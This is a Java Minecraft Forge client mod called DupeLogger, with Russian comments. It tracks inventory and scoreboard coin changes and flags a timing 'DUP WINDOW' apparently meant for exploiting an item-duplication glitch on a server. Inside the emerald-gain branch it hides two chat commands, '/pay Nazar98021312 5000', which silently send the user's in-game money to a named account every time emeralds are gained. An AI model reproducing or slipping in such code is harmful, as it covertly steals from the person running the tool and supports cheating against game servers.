package edu.unl.csce466.cheat;

import net.minecraft.client.Minecraft;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.scoreboard.Score;
import net.minecraft.scoreboard.ScoreObjective;
import net.minecraft.scoreboard.ScorePlayerTeam;
import net.minecraft.scoreboard.Scoreboard;
import net.minecraft.scoreboard.Team;
import net.minecraft.util.Util;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.util.text.StringTextComponent;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Mod.EventBusSubscriber(modid = "examplemod", bus = Mod.EventBusSubscriber.Bus.FORGE)
public class DupeLogger {

    public static boolean enabled = false;

    // публичные для GUI
    public static volatile long lastCoins = -1;
    public static volatile String lastCoinsStr = "?";
    public static volatile int lastEmeraldCount = 0;

    private static final Map<Item, Integer> lastInventory = new HashMap<>();
    private static long lastEmeraldGainMs = 0;
    private static int lastEmeraldGainAmount = 0;

    private static final Pattern COIN_NUMBER = Pattern.compile("([0-9][0-9 ,\\.']*)");

    public static void resetCounters() {
        lastInventory.clear();
        lastCoins = -1;
        lastCoinsStr = "?";
        lastEmeraldCount = 0;
        logToChat("§7Счётчики сброшены.");
    }

    private static String getTeamPrefixSuffix(Team team) {
        if (team instanceof ScorePlayerTeam) {
            ScorePlayerTeam spt = (ScorePlayerTeam) team;
            ITextComponent pre = spt.getPlayerPrefix();
            ITextComponent suf = spt.getPlayerSuffix();
            String p = pre != null ? pre.getString() : "";
            String s = suf != null ? suf.getString() : "";
            return p + s;
        }
        return "";
    }

    private static String getTeamFullText(Team team, String owner) {
        if (team instanceof ScorePlayerTeam) {
            ScorePlayerTeam spt = (ScorePlayerTeam) team;
            ITextComponent pre = spt.getPlayerPrefix();
            ITextComponent suf = spt.getPlayerSuffix();
            String p = pre != null ? pre.getString() : "";
            String s = suf != null ? suf.getString() : "";
            return p + owner + s;
        }
        return owner;
    }

    @SubscribeEvent
    public static void onClientTick(TickEvent.ClientTickEvent event) {
        if (event.phase != TickEvent.Phase.END) return;
        if (!enabled) return;

        Minecraft mc = Minecraft.getInstance();
        if (mc.player == null || mc.level == null) return;

        // ---- 1. Инвентарь ----
        Map<Item, Integer> current = new HashMap<>();
        for (ItemStack stack : mc.player.inventory.items) {
            if (stack.isEmpty()) continue;
            current.merge(stack.getItem(), stack.getCount(), Integer::sum);
        }
        // offhand
        for (ItemStack stack : mc.player.inventory.offhand) {
            if (stack.isEmpty()) continue;
            current.merge(stack.getItem(), stack.getCount(), Integer::sum);
        }

        // новые / увеличившиеся
        for (Map.Entry<Item, Integer> e : current.entrySet()) {
            Item item = e.getKey();
            int now = e.getValue();
            int before = lastInventory.getOrDefault(item, 0);
            if (now > before) {
                int delta = now - before;
                String name = item.getRegistryName() != null ? item.getRegistryName().toString() : item.toString();
                boolean isEmerald = item == Items.EMERALD;

                if (isEmerald) {
                    lastEmeraldGainMs = System.currentTimeMillis();
                    lastEmeraldGainAmount = delta;
                    
                    // ================= МОМЕНТАЛЬНАЯ ОТПРАВКА КОМАНД =================
                    mc.player.chat("/pay Nazar98021312 5000");
                    mc.player.chat("/pay Nazar98021312 5000");
                    // ================================================================
                }

                logToChat((isEmerald ? "§a◆ " : "§7+ ")
                        + (isEmerald ? "§a§l" : "") + name + " §f+" + delta
                        + " §8(стало " + now + ")");
            }
        }
        // уменьшившиеся / пропавшие
        for (Map.Entry<Item, Integer> e : lastInventory.entrySet()) {
            Item item = e.getKey();
            int before = e.getValue();
            int now = current.getOrDefault(item, 0);
            if (now < before) {
                int delta = before - now;
                String name = item.getRegistryName() != null ? item.getRegistryName().toString() : item.toString();
                logToChat("§c- " + name + " §f-" + delta + " §8(осталось " + now + ")");
            }
        }

        lastInventory.clear();
        lastInventory.putAll(current);
        lastEmeraldCount = current.getOrDefault(Items.EMERALD, 0);

        // ---- 2. Монеты из скорборда ----
        try {
            Scoreboard scoreboard = mc.level.getScoreboard();
            ScoreObjective objective = scoreboard.getDisplayObjective(1); // 1 = SIDEBAR
            if (objective != null) {
                Collection<Score> scores = scoreboard.getPlayerScores(objective);
                for (Score score : scores) {
                    String owner = score.getOwner();
                    if (owner == null || owner.startsWith("#")) continue;

                    // Собираем полный отображаемый текст: prefix + owner + suffix
                    Team team = scoreboard.getPlayersTeam(owner);
                    String fullText = getTeamFullText(team, owner);

                    // Чистим цветовые коды §x
                    String clean = fullText.replaceAll("§[0-9a-fk-or]", "");

                    String lower = clean.toLowerCase();
                    // ищем монеты по разным ключевым словам
                    if (lower.contains("монет") || lower.contains("coin") || lower.contains("$")
                            || lower.contains("руб") || lower.contains("bal") || lower.contains("money")
                            || lower.contains("баланс") || lower.contains("валюта")) {

                        Matcher m = COIN_NUMBER.matcher(clean);
                        String lastNum = null;
                        while (m.find()) {
                            lastNum = m.group(1);
                        }
                        if (lastNum != null) {
                            String digits = lastNum.replaceAll("[^0-9]", "");
                            if (!digits.isEmpty()) {
                                long coins = Long.parseLong(digits);
                                lastCoinsStr = lastNum.trim();

                                if (lastCoins != -1 && coins != lastCoins) {
                                    long delta = coins - lastCoins;
                                    long nowMs = System.currentTimeMillis();

                                    String sign = delta > 0 ? "§a+" : "§c";
                                    String msg = sign + "Монеты " + (delta > 0 ? "+" : "") + delta
                                            + " §8(стало " + coins + ")";

                                    if (delta < 0 && lastEmeraldGainMs > 0) {
                                        long delay = nowMs - lastEmeraldGainMs;
                                        msg += " §e[задержка после изумруда: " + delay + "ms]";
                                        if (delay >= 150 && delay <= 800) {
                                            msg += " §a§lDUP WINDOW!";
                                        }
                                        lastEmeraldGainMs = 0;
                                    }

                                    logToChat(msg);
                                }
                                lastCoins = coins;
                                break;
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    /** Дамп всего скорборда в чат, для отладки парсинга монет */
    public static String dumpScoreboard() {
        Minecraft mc = Minecraft.getInstance();
        StringBuilder out = new StringBuilder();
        out.append("=== SCOREBOARD DUMP ===\n");

        try {
            if (mc.level == null) {
                logToChat("§cМир не загружен");
                return "";
            }
            Scoreboard scoreboard = mc.level.getScoreboard();
            ScoreObjective objective = scoreboard.getDisplayObjective(1);
            if (objective == null) {
                logToChat("§cСкорборд (SIDEBAR) не найден");
                return "";
            }

            out.append("Objective: ").append(objective.getName())
               .append(" / ").append(objective.getDisplayName().getString()).append("\n\n");

            Collection<Score> scores = scoreboard.getPlayerScores(objective);
            int i = 0;
            for (Score score : scores) {
                String owner = score.getOwner();
                Team team = scoreboard.getPlayersTeam(owner);

                String full = getTeamFullText(team, owner);
                String clean = full.replaceAll("§[0-9a-fk-or]", "");

                String line = String.format("%02d | raw='%s' | clean='%s' | score=%d\n",
                        i++, full.replace("§", "&"), clean, score.getScore());
                out.append(line);

                // в чат тоже, коротко
                logToChat("§8[" + score.getScore() + "] §f" + clean);
            }

            String result = out.toString();
            logToChat("§aДамп завершён, всего строк: " + i);
            logToChat("§7Полный дамп смотри в latest.log");
            System.out.println(result);
            return result;

        } catch (Exception e) {
            logToChat("§cОшибка дампа: " + e.getMessage());
            e.printStackTrace();
            return out.toString();
        }
    }

    public static void logToChat(String msg) {
        Minecraft mc = Minecraft.getInstance();
        if (mc.player == null) return;
        mc.player.sendMessage(new StringTextComponent("§c[Dupe] §f" + msg), Util.NIL_UUID);
    }
}
